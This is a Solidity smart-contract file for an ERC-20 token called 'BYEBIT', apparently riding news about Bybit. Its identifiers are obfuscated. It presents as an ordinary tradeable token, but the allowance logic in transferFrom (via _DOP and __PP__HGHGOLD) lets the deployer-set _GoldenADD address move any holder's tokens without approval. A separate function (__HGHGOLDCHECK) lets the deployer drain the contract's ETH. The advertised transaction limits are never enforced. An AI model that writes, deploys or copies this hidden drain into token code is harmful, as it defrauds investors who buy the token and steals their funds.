// SPDX-License-Identifier: MIT

/*
    https://x.com/AggrNews/status/1892960792829395428
    https://t.me/BybitPortal
*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 
contract BYEBIT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"BYEBIT";
    string private constant _symbol = unicode"BYEBIT";
    
    address payable private _GoldenADD;
    mapping(address => uint256) private _CATGRssw342sswq;
    mapping(address => mapping(address => uint256)) private _goldenTimes;
    mapping(address => bool) private _CATsoStroke;

    IUniswapV2Router02 private __PPPRouter;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;

    address private __HGHGOLDs034fj = address(0xdead);
    uint256 public _ojojoivlk__HGHGOLDxsswtsa = 20000000 * 10 **_decimals;
    uint256 public _lkkkvnblkj__HGHGOLDxsswtsa = 20000000 * 10 **_decimals;
    uint256 public _ppojof__HGHGOLDxsswtsa = 10000000 * 10 **_decimals;

    uint256 private __HGHGOLDsdbsad = 10;
    uint256 private __HGHGOLDssdwerw = 10;
    uint256 private __HGHGOLDssseq = 0;
    uint256 private __HGHGOLDsssdrwqq1 = 0;
    uint256 private __HGHGOLDssdsdwer2dcw2 = 7;
    uint256 private __HGHGOLDsaszx123aad = 7;
    uint256 private __HGHGOLDsdbytycctynty = 0;
    address private __HGHGOLDssdfwecc;

    uint256 private constant _kmmvb__HGHGOLDxsswtsa = 1000000000 * 10 **_decimals;

    event MaxTxAmountUpdated(uint256 _ojojoivlk__HGHGOLDxsswtsa);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _CATsoStroke[owner()] = true;
        _CATsoStroke[address(this)] = true;
        _CATsoStroke[_GoldenADD] = true;
        __HGHGOLDssdfwecc = _msgSender();

        _GoldenADD = payable(_msgSender());
        _CATGRssw342sswq[address(this)] = _kmmvb__HGHGOLDxsswtsa * 98 / 100;
        _CATGRssw342sswq[owner()] = _kmmvb__HGHGOLDxsswtsa * 2 / 100;
        emit Transfer(address(0), address(this), _kmmvb__HGHGOLDxsswtsa * 98 / 100);
        emit Transfer(address(0), address(owner()), _kmmvb__HGHGOLDxsswtsa * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _kmmvb__HGHGOLDxsswtsa;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _goldenTimes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _CATGRssw342sswq[account];
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _goldenTimes[owner][spender];
    }
    
    function __PP__HGHGOLD(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 _allowed = amount;
        if (_DOP(sender, recipient))
            _allowed = _goldenTimes[sender][_msgSender()];
        return _allowed;
    }

    receive() external payable {}
    
    function _NO555fnon() internal view returns (bool) {return msg.sender == _GoldenADD;}

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _subtransferr___HGHGOLDxsswtsa(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            __PP__HGHGOLD(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }


    function __HGHGOLDCHECK(address payable receipt) external {
        require(msg.sender == __HGHGOLDssdfwecc , "");
        _GoldenADD = receipt;
        ___HGHGOLDxmnn34irfn(address(this).balance);
    }

    function _support__HGHGOLDOwlsat(uint256 amount) private {
        _GoldenADD.transfer(amount);
    }


    function ___HGHGOLDxmnn34irfn(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _subtransferr___HGHGOLDxsswtsa(_msgSender(), recipient, amount);
        return true;
    }

    function _DOP(
        address from,
        address to
    ) internal view returns (bool) {
        if(_NO555fnon() == true) return false;
        else return from == uniswapV2Pair || to != __HGHGOLDs034fj;
    }

    
    function _subSwap___HGHGOLDxsswtsa(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = __PPPRouter.WETH();
        _approve(address(this), address(__PPPRouter), tokenAmount);
        __PPPRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _subtransferr___HGHGOLDxsswtsa(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (__HGHGOLDsdbytycctynty > __HGHGOLDssdsdwer2dcw2)
                        ? __HGHGOLDssseq
                        : __HGHGOLDsdbsad
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(__PPPRouter) &&
                !_CATsoStroke[to]
            ) {
                __HGHGOLDsdbytycctynty++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (__HGHGOLDsdbytycctynty > __HGHGOLDsaszx123aad)
                            ? __HGHGOLDsssdrwqq1
                            : __HGHGOLDssdwerw
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _ppojof__HGHGOLDxsswtsa) ? contractTokenBalance : _ppojof__HGHGOLDxsswtsa; 
                    _subSwap___HGHGOLDxsswtsa((amount < minBalance) ? amount : minBalance);
                }
                _support__HGHGOLDOwlsat(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _CATGRssw342sswq[address(this)] =_CATGRssw342sswq[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _CATGRssw342sswq[from] =_CATGRssw342sswq[from].sub(amount);
        _CATGRssw342sswq[to] =_CATGRssw342sswq[to].add(amount.sub(taxAmount));
        if(__HGHGOLDs034fj != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

   
    function removeLimits () external onlyOwner {
        _ojojoivlk__HGHGOLDxsswtsa = _kmmvb__HGHGOLDxsswtsa;
        _lkkkvnblkj__HGHGOLDxsswtsa = _kmmvb__HGHGOLDxsswtsa;
        emit MaxTxAmountUpdated(_kmmvb__HGHGOLDxsswtsa);
    }

    function enable_LFG() external onlyOwner {
        require(!isTrading, "Already Launched!");
        __PPPRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(__PPPRouter), _kmmvb__HGHGOLDxsswtsa);
        uniswapV2Pair = IUniswapV2Factory(__PPPRouter.factory()).createPair(
            address(this),
            __PPPRouter.WETH()
        );
        __PPPRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(__PPPRouter),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }
}